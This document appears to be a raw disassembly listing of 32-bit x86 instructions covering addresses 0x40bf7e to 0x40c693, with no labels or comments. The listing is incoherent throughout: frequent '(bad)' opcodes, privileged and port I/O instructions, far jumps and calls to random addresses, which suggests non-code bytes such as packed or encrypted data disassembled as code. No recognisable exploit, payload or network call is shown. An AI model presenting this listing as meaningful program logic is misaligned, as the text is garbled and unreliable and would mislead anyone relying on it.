  40bf7e:	add    dh,BYTE PTR [di+0x6335]
  40bf83:	jbe    0x40bfa2
  40bf85:	inc    edx
  40bf86:	arpl   WORD PTR [edi+ecx*2-0x39],dx
  40bf8a:	fldenv [esi-0x55]
  40bf8d:	icebp  
  40bf8e:	or     ch,0x43
  40bf91:	cli    
  40bf92:	sub    esi,ebx
  40bf94:	push   ds
  40bf95:	test   edi,edx
  40bf97:	mov    BYTE PTR [ebx+0x5b],cl
  40bf9a:	inc    edi
  40bf9b:	repz jmp DWORD PTR [esi]
  40bf9e:	imul   eax,DWORD PTR [eax-0x7],0xe4345e09
  40bfa5:	(bad)  
  40bfa6:	mov    ecx,0x3078b408
  40bfab:	push   esi
  40bfac:	and    al,0xd1
  40bfae:	stos   BYTE PTR es:[edi],al
  40bfaf:	cmp    al,0xe7
  40bfb1:	mov    DWORD PTR [esi+0x1a],0xe6d06e8f
  40bfb8:	mov    ebx,0x2fa9c36d
  40bfbd:	dec    eax
  40bfbe:	push   ds
  40bfbf:	js     0x40bff3
  40bfc1:	mov    edx,DWORD PTR [ebx]
  40bfc3:	popf   
  40bfc4:	jmp    DWORD PTR [edx+0x20]
  40bfc7:	mov    eax,0xc919e9c5
  40bfcc:	into   
  40bfcd:	arpl   WORD PTR [eax-0x4d445d41],si
  40bfd3:	daa    
  40bfd4:	clc    
  40bfd5:	repz bound ebp,QWORD PTR [edi+eax*8]
  40bfd9:	xchg   ebx,eax
  40bfda:	ins    BYTE PTR es:[edi],dx
  40bfdb:	and    DWORD PTR [ebp-0x56],ebp
  40bfde:	pop    ss
  40bfdf:	out    dx,eax
  40bfe0:	jle    0x40bfe8
  40bfe2:	lods   al,BYTE PTR ds:[esi]
  40bfe3:	xor    cl,BYTE PTR [ebx-0x1]
  40bfe6:	push   0xffffff8b
  40bfe8:	test   al,0x1b
  40bfea:	test   al,0xd0
  40bfec:	repz jge 0x40bf71
  40bfef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff0:	push   esp
  40bff1:	add    bl,BYTE PTR [ecx-0x7e]
  40bff4:	dec    esi
  40bff5:	imul   ecx,DWORD PTR [ecx],0x5f
  40bff8:	test   dh,dh
  40bffa:	lock jns 0x40bf9c
  40bffd:	out    0x24,al
  40bfff:	add    ebx,edx
  40c001:	mov    esi,DWORD PTR [edx]
  40c003:	xchg   esi,eax
  40c004:	scas   eax,DWORD PTR es:[edi]
  40c005:	mov    esp,0xf0942e91
  40c00a:	sahf   
  40c00b:	nop
  40c00c:	stos   BYTE PTR es:[edi],al
  40c00d:	jmp    0xe5452051
  40c012:	mov    ah,0xed
  40c014:	mov    ch,BYTE PTR [esi-0x1d]
  40c017:	inc    ecx
  40c018:	iret   
  40c019:	jae    0x40c056
  40c01b:	aad    0xf3
  40c01d:	xlat   BYTE PTR ds:[ebx]
  40c01e:	add    BYTE PTR [ebp+0x79],cl
  40c021:	xor    BYTE PTR [ebx],dl
  40c023:	inc    edi
  40c024:	xchg   ecx,eax
  40c025:	icebp  
  40c026:	push   dx
  40c028:	or     esi,DWORD PTR [ebx]
  40c02a:	xchg   ebp,eax
  40c02b:	cmp    ebp,edx
  40c02d:	out    dx,al
  40c02e:	rcl    BYTE PTR [ecx+0x1c],0xdb
  40c032:	xchg   ecx,eax
  40c033:	bound  ebx,QWORD PTR [edx+0x76]
  40c036:	repz mov ebp,0xd4678e25
  40c03c:	jge    0x40c045
  40c03e:	dec    eax
  40c03f:	cld    
  40c040:	fwait
  40c041:	jno    0x40bffe
  40c043:	sahf   
  40c044:	push   ebp
  40c045:	jg     0x40bfe9
  40c047:	call   0x60aae5b8
  40c04c:	jnp    0x40c0ad
  40c04e:	sbb    ebp,DWORD PTR [esp+ebx*2]
  40c051:	adc    al,0xbb
  40c053:	dec    esp
  40c054:	mov    cl,0xe4
  40c056:	inc    ebp
  40c057:	in     al,0x3f
  40c059:	mov    cl,0x9f
  40c05b:	pop    DWORD PTR [eax]
  40c05d:	out    dx,eax
  40c05e:	dec    esp
  40c05f:	es pop ss
  40c061:	mov    WORD PTR [esi+0x67],gs
  40c064:	xor    DWORD PTR [ebx+0x34],0x29bf0a1b
  40c06b:	mov    dl,0xbb
  40c06d:	sub    dh,ah
  40c06f:	je     0x40c0bd
  40c071:	add    ecx,ecx
  40c073:	cmp    al,0xdd
  40c075:	std    
  40c076:	push   ds
  40c077:	in     eax,dx
  40c078:	lods   eax,DWORD PTR ds:[esi]
  40c079:	adc    DWORD PTR [ecx],0x1d1d43bd
  40c07f:	jne    0x40c075
  40c081:	mov    DWORD PTR [ebx],eax
  40c083:	mov    ebp,0xf158e1bd
  40c088:	lea    edi,[ebx+edx*8]
  40c08b:	inc    ecx
  40c08c:	inc    ebp
  40c08d:	jl     0x40c0a5
  40c08f:	inc    esp
  40c090:	test   BYTE PTR [esi-0x15],dh
  40c093:	sahf   
  40c094:	xchg   edx,eax
  40c095:	dec    esp
  40c096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c097:	and    eax,0x599b1748
  40c09c:	ret    0x7d9a
  40c09f:	sbb    DWORD PTR [edx],esi
  40c0a1:	fs push cs
  40c0a3:	dec    ecx
  40c0a4:	jnp    0x40c0aa
  40c0a6:	das    
  40c0a7:	fcomp  DWORD PTR [esi]
  40c0a9:	mov    dl,0x1c
  40c0ab:	jae    0x40c0af
  40c0ad:	arpl   WORD PTR [edx+0x101f49d6],bx
  40c0b3:	fcmovnbe st,st(0)
  40c0b5:	call   edx
  40c0b7:	xchg   ebx,eax
  40c0b8:	fld    QWORD PTR [edi+0x44daa5d3]
  40c0be:	jmp    0xe9f5:0xf8f00351
  40c0c5:	dec    eax
  40c0c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0c7:	sbb    al,0x53
  40c0c9:	add    DWORD PTR ds:0x898f8e3e,edi
  40c0cf:	lods   al,BYTE PTR ds:[esi]
  40c0d0:	sub    al,0xc8
  40c0d2:	mov    BYTE PTR [esi-0x4659d34a],al
  40c0d8:	sahf   
  40c0d9:	arpl   WORD PTR [esp+eax*8],si
  40c0dc:	stos   BYTE PTR es:[edi],al
  40c0dd:	jge    0x40c131
  40c0df:	xchg   DWORD PTR [ebx-0x22],ecx
  40c0e2:	cmp    DWORD PTR [ebp-0x34],edx
  40c0e5:	mov    dh,0x7e
  40c0e7:	xchg   esp,eax
  40c0e8:	lahf   
  40c0e9:	push   ss
  40c0ea:	loope  0x40c0bd
  40c0ec:	xchg   ecx,eax
  40c0ed:	movsx  esi,WORD PTR [edi+0x34b151f2]
  40c0f4:	dec    edx
  40c0f5:	add    DWORD PTR [ecx+esi*8-0x24c36950],edx
  40c0fc:	stos   BYTE PTR es:[edi],al
  40c0fd:	jnp    0xf8aa6c4e
  40c103:	sub    eax,0x389efa52
  40c108:	add    ebx,edx
  40c10a:	or     DWORD PTR ds:0x2d4bb2f2,ebp
  40c110:	mov    eax,ds:0xcf4c703a
  40c115:	mov    al,0x5a
  40c117:	inc    ebx
  40c118:	mov    ds:0xd40806cc,eax
  40c11d:	or     al,0x9e
  40c11f:	(bad)  
  40c120:	aaa    
  40c121:	sub    edi,esp
  40c123:	mov    al,0x3e
  40c125:	mov    ah,0x8a
  40c127:	mov    al,ds:0xe5f74bfa
  40c12c:	or     ecx,ecx
  40c12e:	dec    ecx
  40c12f:	and    DWORD PTR [edx-0x4a5fc016],0xfffffffe
  40c136:	sti    
  40c137:	icebp  
  40c138:	repz (bad) 
  40c13a:	and    ch,cl
  40c13c:	jo     0x40c0f6
  40c13e:	mov    DWORD PTR [edx-0x4ef0c9e5],ebx
  40c144:	repz mov fs,WORD PTR [edi-0x3261e813]
  40c14b:	xchg   ebx,eax
  40c14c:	or     DWORD PTR [esi],ebx
  40c14e:	(bad)  
  40c14f:	int    0xa5
  40c151:	inc    edi
  40c152:	sub    al,0x2c
  40c154:	jmp    FWORD PTR [ebp-0x2cde67a8]
  40c15a:	pop    ds
  40c15b:	(bad)  
  40c15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c15d:	adc    DWORD PTR [edx+0x22],ebp
  40c160:	inc    ebx
  40c161:	(bad)  
  40c162:	cmp    bl,BYTE PTR [ecx+esi*1-0x3f]
  40c166:	sub    cl,bl
  40c168:	and    bl,bh
  40c16a:	std    
  40c16b:	test   al,0xa7
  40c16d:	out    dx,al
  40c16e:	idiv   BYTE PTR [ebx]
  40c170:	retf   
  40c171:	push   ebx
  40c172:	mov    esp,0x7adec6a4
  40c177:	test   BYTE PTR [eax-0x35],cl
  40c17a:	fisub  DWORD PTR [ecx-0x7d]
  40c17d:	mov    eax,0xe2c2283d
  40c182:	and    ebx,DWORD PTR [esi]
  40c184:	iret   
  40c185:	xor    eax,0xe74b2c1
  40c18a:	retf   
  40c18b:	inc    eax
  40c18c:	inc    ebx
  40c18d:	stc    
  40c18e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c18f:	jae    0x40c1de
  40c191:	enter  0xf3cd,0xd6
  40c195:	outs   dx,BYTE PTR ds:[esi]
  40c196:	into   
  40c197:	ret    0x6bf8
  40c19a:	jg     0x40c162
  40c19c:	shl    DWORD PTR [ecx-0x60],cl
  40c19f:	cmc    
  40c1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1a1:	cmp    al,0xde
  40c1a3:	push   esp
  40c1a4:	es cld 
  40c1a6:	inc    esi
  40c1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a8:	ja     0x40c1df
  40c1aa:	and    al,0x66
  40c1ac:	or     DWORD PTR [esi-0x1780dabd],edi
  40c1b2:	pusha  
  40c1b3:	push   esi
  40c1b4:	(bad)  
  40c1b5:	out    dx,eax
  40c1b6:	call   0xaf09cf27
  40c1bb:	pop    ebp
  40c1bc:	rcl    BYTE PTR [edi+edi*2-0xe],0xe
  40c1c1:	pusha  
  40c1c2:	ret    0xbb13
  40c1c5:	push   0x62
  40c1c7:	gs pop ecx
  40c1c9:	sahf   
  40c1ca:	sub    eax,0x38cff487
  40c1cf:	sbb    al,0xc
  40c1d1:	sbb    al,0xdd
  40c1d3:	fld    TBYTE PTR [esi]
  40c1d5:	and    BYTE PTR [ebp+0x1695ae1c],ah
  40c1db:	(bad)  
  40c1dc:	or     ebx,DWORD PTR [edx+0x53]
  40c1df:	rcr    BYTE PTR [edx],0x22
  40c1e2:	ins    BYTE PTR es:[edi],dx
  40c1e3:	shl    dh,0x8e
  40c1e6:	shr    BYTE PTR [ecx-0x12],1
  40c1e9:	test   eax,0x720f3303
  40c1ee:	pop    edx
  40c1ef:	retf   
  40c1f0:	jbe    0x40c186
  40c1f2:	add    al,0xb7
  40c1f4:	jns    0x40c18e
  40c1f6:	jae    0x40c218
  40c1f8:	mov    ah,0x30
  40c1fa:	sub    DWORD PTR [ebx],ebx
  40c1fc:	add    dl,BYTE PTR [edx-0x1809e1ea]
  40c202:	xchg   edi,eax
  40c203:	xchg   ebp,eax
  40c204:	neg    DWORD PTR [edx]
  40c206:	or     BYTE PTR [esi+0x23],0xd9
  40c20a:	or     DWORD PTR [ebx-0x39984bbc],edx
  40c210:	loop   0x40c218
  40c212:	ret    
  40c213:	arpl   WORD PTR [esi+0x10a9ebdf],di
  40c219:	mov    al,0xed
  40c21b:	jns    0x40c1d6
  40c21d:	fcom   QWORD PTR es:[esi]
  40c220:	jae    0x40c272
  40c222:	mov    cl,0x7c
  40c224:	stos   BYTE PTR es:[edi],al
  40c225:	addr16 addr16 xor eax,edx
  40c229:	fxch   st(7)
  40c22b:	push   cs
  40c22c:	aad    0x82
  40c22e:	mov    WORD PTR [eax-0x1],ds
  40c231:	xchg   ecx,eax
  40c232:	sbb    esp,DWORD PTR [ebx+0x79ff1197]
  40c238:	into   
  40c239:	call   0x1e3:0x536813c1
  40c240:	xchg   ebp,eax
  40c241:	mov    dh,0xd3
  40c243:	and    al,0x87
  40c245:	sti    
  40c246:	int3   
  40c247:	shr    bh,0x7
  40c24a:	dec    ebx
  40c24b:	sbb    DWORD PTR [ecx-0x68],esi
  40c24e:	ret    
  40c24f:	std    
  40c250:	xchg   DWORD PTR [edx+eiz*4],ebx
  40c253:	dec    ebx
  40c254:	call   0xecb96a8e
  40c259:	adc    eax,0xebd3e9ae
  40c25e:	dec    ebx
  40c25f:	fcmovne st,st(3)
  40c261:	cmp    bh,BYTE PTR [edx+0x79]
  40c264:	jp     0x40c2a8
  40c266:	pop    esp
  40c267:	dec    esi
  40c268:	mov    edi,0xe21822fc
  40c26d:	shl    DWORD PTR [ebx-0x5b170c22],cl
  40c273:	scas   eax,DWORD PTR es:[edi]
  40c274:	repnz inc edx
  40c276:	in     eax,dx
  40c277:	das    
  40c278:	in     eax,dx
  40c279:	xlat   BYTE PTR ds:[ebx]
  40c27a:	pushf  
  40c27b:	mov    ss,edi
  40c27d:	aad    0x80
  40c27f:	cmp    ch,BYTE PTR [edx-0xd796f02]
  40c285:	scas   al,BYTE PTR es:[edi]
  40c286:	test   al,0x1d
  40c288:	xchg   edi,eax
  40c289:	nop
  40c28a:	in     al,dx
  40c28b:	pop    ecx
  40c28c:	adc    al,0x4c
  40c28e:	outs   dx,DWORD PTR ds:[esi]
  40c28f:	cmp    DWORD PTR [ecx+eiz*8+0x6d],ebx
  40c293:	sub    bl,0xde
  40c296:	arpl   WORD PTR [ebp-0x65b6a6a5],ax
  40c29c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c29d:	push   ebp
  40c29e:	jae    0x40c251
  40c2a0:	inc    edx
  40c2a1:	and    DWORD PTR [ebp+0x6cc9a0c3],esp
  40c2a7:	adc    dl,al
  40c2a9:	xchg   DWORD PTR [esi],edx
  40c2ab:	mov    ds:0x785f049a,eax
  40c2b0:	in     eax,dx
  40c2b1:	adc    cl,ch
  40c2b3:	in     eax,dx
  40c2b4:	lahf   
  40c2b5:	push   esp
  40c2b6:	(bad)  
  40c2b7:	mov    dh,0x93
  40c2b9:	xchg   ecx,eax
  40c2ba:	sbb    dl,BYTE PTR [eax+ebp*8+0x3e]
  40c2be:	pushf  
  40c2bf:	test   al,0x3f
  40c2c1:	test   DWORD PTR [edx+0x713cecef],ecx
  40c2c7:	and    DWORD PTR [edx-0x41e04f86],ebx
  40c2cd:	dec    esp
  40c2ce:	jbe    0x40c28e
  40c2d0:	mov    eax,ds:0xf915b2dd
  40c2d5:	and    eax,0x1fbf870
  40c2da:	ret    
  40c2db:	aaa    
  40c2dc:	ror    DWORD PTR [esi+0x279f905d],cl
  40c2e2:	sbb    dh,0xbf
  40c2e5:	pop    ds
  40c2e6:	int3   
  40c2e7:	sub    eax,0xdf124524
  40c2ec:	arpl   sp,bp
  40c2ee:	push   ss
  40c2ef:	call   0x50c49dc5
  40c2f4:	(bad)  
  40c2f5:	cmp    al,0xa4
  40c2f7:	jle    0x40c2d3
  40c2f9:	mov    esp,0x5ec08663
  40c2fe:	mov    DWORD PTR [ebx+0x3d5be244],esp
  40c304:	push   esi
  40c305:	retf   
  40c306:	rcr    DWORD PTR [esi+0x23],0x45
  40c30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c30b:	jno    0x40c2fb
  40c30d:	loopne 0x40c371
  40c30f:	ret    0x1725
  40c312:	jo     0x40c303
  40c314:	imul   DWORD PTR [eax+0x3a]
  40c317:	sub    eax,0xeb08f697
  40c31c:	mov    ah,0x98
  40c31e:	pop    es
  40c31f:	inc    ecx
  40c320:	ss dec edx
  40c322:	test   DWORD PTR [ecx-0x6e],0x80e96339
  40c329:	mov    bh,0xb8
  40c32b:	shr    DWORD PTR [edi+0x2d],0x22
  40c32f:	pop    esi
  40c330:	push   0xd1d5389f
  40c335:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40c337:	mov    cl,0x87
  40c339:	sbb    BYTE PTR ss:[edx],cl
  40c33c:	jle    0x40c323
  40c33e:	test   al,0xde
  40c340:	add    al,0x44
  40c342:	ret    0x684d
  40c345:	lahf   
  40c346:	sbb    al,0xf1
  40c348:	push   ebx
  40c349:	mov    eax,0x8f7f557a
  40c34e:	(bad)
  40c351:	inc    esi
  40c352:	adc    al,0x4b
  40c354:	cdq    
  40c355:	or     ah,0x1a
  40c358:	lds    eax,FWORD PTR [esi]
  40c35a:	test   al,0xd7
  40c35c:	and    BYTE PTR [eax+0x4168b818],ch
  40c362:	dec    eax
  40c363:	outs   dx,BYTE PTR ds:[esi]
  40c364:	fdiv   DWORD PTR [ecx-0x57]
  40c367:	pop    eax
  40c368:	sbb    BYTE PTR [edi],al
  40c36a:	test   eax,0x4ca6221d
  40c36f:	ja     0x40c3c9
  40c371:	sti    
  40c372:	je     0x40c319
  40c374:	push   edi
  40c375:	pop    ebp
  40c376:	push   eax
  40c377:	cmp    al,0x32
  40c379:	jo     0x40c36a
  40c37b:	rol    edi,1
  40c37d:	push   ebx
  40c37e:	stc    
  40c37f:	cmp    dh,al
  40c381:	sbb    edx,DWORD PTR [eax-0x7a0988d1]
  40c387:	adc    BYTE PTR [eax+0x3aba4c9b],bh
  40c38d:	imul   BYTE PTR [ebx]
  40c38f:	mov    ds:0xef15cd3a,eax
  40c394:	int    0x76
  40c396:	or     eax,0xb01ffd3a
  40c39b:	in     eax,0x75
  40c39d:	sahf   
  40c39e:	ins    DWORD PTR es:[edi],dx
  40c39f:	repz mov dh,0xf8
  40c3a3:	push   es
  40c3a4:	jge    0x40c41a
  40c3a6:	leave  
  40c3a7:	dec    ebx
  40c3a8:	fsubr  QWORD PTR [esi]
  40c3aa:	scas   al,BYTE PTR es:[edi]
  40c3ab:	test   DWORD PTR [edi],0xada41ca
  40c3b1:	divps  xmm3,xmm2
  40c3b4:	jmp    0x40c3be
  40c3b6:	je     0x40c432
  40c3b8:	subps  xmm3,XMMWORD PTR [ebx]
  40c3bb:	sar    edx,0x53
  40c3be:	add    al,0x98
  40c3c0:	iret   
  40c3c1:	sti    
  40c3c2:	ins    DWORD PTR es:[edi],dx
  40c3c3:	xchg   DWORD PTR cs:[ebx-0x730a84db],esi
  40c3ca:	push   edx
  40c3cb:	dec    ebx
  40c3cc:	add    DWORD PTR [ebp-0x65e951d4],0xffffff8a
  40c3d3:	sub    al,0xa1
  40c3d5:	sub    eax,0x57b35e46
  40c3da:	fild   DWORD PTR [eax]
  40c3dc:	pop    es
  40c3dd:	dec    eax
  40c3de:	call   0x4ba957a0
  40c3e3:	je     0x40c430
  40c3e5:	call   0xdc97b1e5
  40c3ea:	xchg   esi,eax
  40c3eb:	push   ecx
  40c3ed:	mov    dl,ah
  40c3ef:	lds    ebx,FWORD PTR [ebp+0x26c1ceb1]
  40c3f5:	(bad)  
  40c3f6:	sbb    DWORD PTR [ecx+0xd],ebp
  40c3f9:	fsubp  st(1),st
  40c3fb:	dec    ebx
  40c3fc:	inc    edi
  40c3fd:	sbb    eax,DWORD PTR [edi+0x19]
  40c400:	fistp  WORD PTR [eax+0x6e64ff73]
  40c406:	outs   dx,DWORD PTR ds:[esi]
  40c407:	cmp    ebx,DWORD PTR [edi-0x16]
  40c40a:	mov    ecx,cr6
  40c40d:	inc    edi
  40c40e:	out    dx,eax
  40c40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c410:	loope  0x40c440
  40c412:	(bad)  
  40c414:	sbb    edx,edi
  40c416:	mov    DWORD PTR [ecx],eax
  40c418:	(bad)  
  40c419:	inc    esp
  40c41a:	and    edi,eax
  40c41c:	lods   al,BYTE PTR ds:[esi]
  40c41d:	sti    
  40c41e:	sbb    bh,bl
  40c420:	sbb    al,0x72
  40c422:	sbb    BYTE PTR [ebx],dh
  40c424:	push   ebp
  40c425:	aaa    
  40c426:	cmp    al,0xbd
  40c428:	out    0x0,eax
  40c42a:	jge    0x40c427
  40c42c:	fs push eax
  40c42e:	in     eax,0xb6
  40c430:	test   bl,al
  40c432:	fsub   QWORD PTR [edi-0x5]
  40c435:	mov    ebx,DWORD PTR [ebx+0x15]
  40c438:	pusha  
  40c439:	nop
  40c43a:	ror    BYTE PTR [edi+0x9],0x11
  40c43e:	push   edi
  40c43f:	dec    ebp
  40c440:	or     edx,DWORD PTR [ebp+edi*1+0x55]
  40c444:	repnz outs dx,BYTE PTR ds:[esi]
  40c446:	cmp    eax,0x1308da35
  40c44b:	mov    esp,0x52790769
  40c450:	fucomi st,st(3)
  40c452:	push   ebp
  40c453:	pop    ss
  40c454:	pop    es
  40c455:	ficomp DWORD PTR [ecx+0x2ca24f76]
  40c45b:	sub    ecx,edx
  40c45d:	(bad)  
  40c45e:	cmp    eax,0x81056a8c
  40c463:	ins    BYTE PTR es:[edi],dx
  40c464:	gs fs jb 0x40c458
  40c468:	push   0xffffffc6
  40c46a:	mov    ds:0x570261fe,al
  40c46f:	sub    eax,0x1a5a1bf5
  40c474:	pop    ecx
  40c475:	lahf   
  40c476:	or     DWORD PTR [esi],esp
  40c478:	out    0xd5,al
  40c47a:	push   ds
  40c47b:	ret    
  40c47c:	cmp    bl,BYTE PTR [edx-0x15c2493c]
  40c482:	dec    edi
  40c483:	ret    
  40c484:	ss adc eax,0x275f796e
  40c48a:	icebp  
  40c48b:	jmp    0xe238:0xecd54e56
  40c492:	jb     0x40c480
  40c494:	jne    0x40c41d
  40c496:	xor    DWORD PTR [ebx-0x5e7def56],edx
  40c49c:	cmp    cl,bh
  40c49e:	retf   0x80da
  40c4a1:	inc    edi
  40c4a2:	popa   
  40c4a3:	lods   al,BYTE PTR ds:[esi]
  40c4a4:	and    bh,ah
  40c4a6:	push   ecx
  40c4a7:	pop    ebp
  40c4a8:	and    BYTE PTR [edx-0x1],ch
  40c4ab:	fnstsw WORD PTR [ecx-0x5486a03e]
  40c4b1:	sub    BYTE PTR [ebx-0x10],0xd7
  40c4b5:	push   edx
  40c4b6:	xchg   esp,eax
  40c4b7:	sbb    eax,0xf8d68ad1
  40c4bc:	add    al,0xbd
  40c4be:	nop
  40c4bf:	(bad)  
  40c4c1:	ret    
  40c4c2:	sbb    BYTE PTR ds:[ebp-0x4f7710],dh
  40c4c9:	ret    
  40c4ca:	ins    DWORD PTR es:[edi],dx
  40c4cb:	das    
  40c4cc:	call   0x2874:0xd0f31d5b
  40c4d3:	adc    edi,eax
  40c4d5:	out    0x26,al
  40c4d7:	dec    ecx
  40c4d8:	enter  0x3bb9,0xba
  40c4dc:	fild   WORD PTR [ebp+0x2e55a9a3]
  40c4e2:	cmp    al,0x74
  40c4e4:	mov    BYTE PTR [esi],ch
  40c4e6:	mul    BYTE PTR [ebx+0x38]
  40c4e9:	sbb    al,BYTE PTR [ecx+0x24]
  40c4ec:	sbb    BYTE PTR [ebp-0x77],ah
  40c4ef:	les    ebp,FWORD PTR [ebx-0x5045aaef]
  40c4f5:	in     al,0x13
  40c4f7:	pop    edi
  40c4f8:	sub    ah,BYTE PTR [esi-0x2d]
  40c4fb:	mov    edx,0xff3b1b81
  40c500:	in     al,dx
  40c501:	inc    edx
  40c502:	(bad)  
  40c503:	in     eax,dx
  40c504:	loope  0x40c4bc
  40c506:	pop    edx
  40c507:	icebp  
  40c508:	push   edx
  40c509:	imul   ebp,DWORD PTR [ebp-0x38],0x87f8fc41
  40c510:	xchg   ebx,eax
  40c511:	fs add eax,edx
  40c514:	in     al,0xbd
  40c516:	scas   al,BYTE PTR es:[edi]
  40c517:	mov    ecx,DWORD PTR [edi+0x78b1118a]
  40c51d:	repz imul esp,DWORD PTR [esi],0x60
  40c521:	cdq    
  40c522:	adc    dh,BYTE PTR [edi-0x78]
  40c525:	(bad)  
  40c526:	stos   DWORD PTR es:[edi],eax
  40c527:	jl     0x40c4ca
  40c529:	pop    esp
  40c52a:	outs   dx,BYTE PTR ds:[esi]
  40c52b:	daa    
  40c52c:	xor    al,0xbc
  40c52e:	or     ecx,DWORD PTR [edx+0x59a4bf00]
  40c534:	xor    dl,BYTE PTR [edx]
  40c536:	(bad)  
  40c537:	jno    0x40c54b
  40c539:	test   al,bl
  40c53b:	push   ecx
  40c53c:	jb     0x40c503
  40c53e:	aas    
  40c53f:	cmp    DWORD PTR [esi-0x70],edi
  40c542:	xchg   esp,eax
  40c543:	test   eax,0x99cd9b30
  40c548:	and    eax,0x3efbd59a
  40c54d:	add    al,BYTE PTR [ebx+0x423e43e8]
  40c553:	fidivr WORD PTR [ecx-0x3ea82239]
  40c559:	sub    edx,esi
  40c55b:	mov    BYTE PTR [ecx],bl
  40c55d:	imul   esi,DWORD PTR [edx+eiz*8],0xffffffe4
  40c561:	rcl    BYTE PTR [esi+0x79c10354],0x1b
  40c568:	add    cl,BYTE PTR [esi+0x799ab609]
  40c56e:	xchg   ebx,eax
  40c56f:	scas   eax,DWORD PTR es:[edi]
  40c570:	and    dl,BYTE PTR [esi+0x61]
  40c573:	cmp    ch,BYTE PTR [eax]
  40c575:	imul   edx,eax,0x16
  40c578:	mov    edx,ecx
  40c57a:	jg     0x40c5cc
  40c57c:	aas    
  40c57d:	mov    ah,0x89
  40c57f:	leave  
  40c580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c581:	(bad)  
  40c582:	xchg   esp,eax
  40c583:	adc    dl,BYTE PTR [edx]
  40c585:	dec    ecx
  40c586:	retf   
  40c587:	push   esp
  40c588:	es nop
  40c58a:	sbb    eax,0xd4304d74
  40c58f:	in     al,0xe8
  40c591:	das    
  40c592:	ficomp DWORD PTR [ebp-0x621bc04b]
  40c598:	enter  0xdd4c,0x82
  40c59c:	test   BYTE PTR [edi-0x7a],al
  40c59f:	xlat   BYTE PTR ds:[ebx]
  40c5a0:	in     eax,dx
  40c5a1:	xchg   esp,eax
  40c5a2:	out    dx,eax
  40c5a3:	sbb    al,0x74
  40c5a5:	data16 outs dx,BYTE PTR ds:[esi]
  40c5a7:	jmp    0x40c55c
  40c5a9:	and    DWORD PTR [ebx],ebx
  40c5ab:	push   ebp
  40c5ac:	test   al,0x69
  40c5ae:	mov    ah,0x76
  40c5b0:	ficom  DWORD PTR [eax+edx*1-0x73]
  40c5b4:	sub    ah,cl
  40c5b6:	adc    BYTE PTR [eax],ah
  40c5b8:	xor    eax,0xd1bc7f87
  40c5bd:	xchg   BYTE PTR [ecx],dl
  40c5bf:	std    
  40c5c0:	into   
  40c5c1:	pop    ebx
  40c5c2:	outs   dx,BYTE PTR ds:[esi]
  40c5c3:	dec    ecx
  40c5c4:	aas    
  40c5c5:	inc    eax
  40c5c6:	out    dx,eax
  40c5c7:	stc    
  40c5c8:	(bad)  
  40c5c9:	lods   al,BYTE PTR ds:[esi]
  40c5ca:	push   esp
  40c5cb:	popa   
  40c5cc:	ss sbb al,0x1
  40c5cf:	je     0x40c570
  40c5d1:	mov    bh,0x1c
  40c5d3:	(bad)  
  40c5d4:	test   al,0xa
  40c5d6:	or     al,0xa
  40c5d8:	pop    ebx
  40c5d9:	and    eax,0x2f692ca7
  40c5de:	iret   
  40c5df:	sti    
  40c5e0:	mov    ds:0xe196c27,al
  40c5e5:	push   ecx
  40c5e6:	pop    ds
  40c5e7:	adc    al,BYTE PTR [edi-0x2531aaa4]
  40c5ed:	pop    ecx
  40c5ee:	fnstenv [edx-0x3e72ca8d]
  40c5f4:	pop    ecx
  40c5f5:	out    0x12,al
  40c5f7:	addr16 cld 
  40c5f9:	scas   al,BYTE PTR es:[edi]
  40c5fa:	push   edi
  40c5fb:	jge    0x40c5f6
  40c5fd:	push   edx
  40c5fe:	push   ss
  40c5ff:	xor    dl,BYTE PTR [esp+edi*1-0x39]
  40c603:	cmc    
  40c604:	push   ebp
  40c605:	mov    ch,BYTE PTR [eax+0x16]
  40c608:	addr16 jle 0x40c5d9
  40c60b:	(bad)  
  40c60c:	in     eax,dx
  40c60d:	dec    esi
  40c60e:	fdivr  QWORD PTR [ebx-0x605daeae]
  40c614:	add    DWORD PTR [ecx+0x14b115ea],eax
  40c61a:	dec    eax
  40c61b:	pop    es
  40c61c:	push   edi
  40c61d:	adc    DWORD PTR [eax+0x2c],ebp
  40c620:	fcomp  st(3)
  40c622:	shl    BYTE PTR [ecx-0x5d5268c0],cl
  40c628:	jne    0x40c618
  40c62a:	loop   0x40c66a
  40c62c:	fild   QWORD PTR [edi-0x7d865cc1]
  40c632:	shr    dh,cl
  40c634:	push   esp
  40c635:	jo     0x40c61c
  40c637:	sbb    esp,ebp
  40c639:	retf   0x85b2
  40c63c:	jae    0x40c5fb
  40c63e:	dec    edx
  40c63f:	aam    0x1c
  40c641:	sub    eax,0x4b86debd
  40c646:	bnd jp 0x40c668
  40c649:	cmp    BYTE PTR [ebp-0x3d],dh
  40c64c:	sbb    eax,0x36eddbdc
  40c651:	ficomp WORD PTR [esi]
  40c653:	stos   BYTE PTR es:[edi],al
  40c654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c655:	mov    DWORD PTR [ecx-0x3a],esp
  40c658:	jae    0x40c620
  40c65a:	into   
  40c65b:	inc    edi
  40c65c:	imul   esi,DWORD PTR [edi+0x5],0xbba50556
  40c663:	pop    ss
  40c664:	jp     0x40c5e8
  40c666:	inc    esp
  40c667:	xlat   BYTE PTR ds:[ebx]
  40c668:	mov    edi,0x1eda1cf0
  40c66d:	mov    ch,0xcd
  40c66f:	leave  
  40c670:	or     bl,BYTE PTR [ebp-0x28]
  40c673:	xchg   edx,eax
  40c675:	adc    BYTE PTR ds:0xf8dc3237,0x96
  40c67c:	adc    al,0xe
  40c67e:	out    0xc5,eax
  40c680:	test   al,0x12
  40c682:	mov    ss,esp
  40c684:	mov    eax,0xba7982f4
  40c689:	lahf   
  40c68a:	gs xor edi,esi
  40c68d:	jbe    0x40c6be
  40c68f:	sbb    BYTE PTR [eax-0x9],0xeb
  40c693:	push   cs
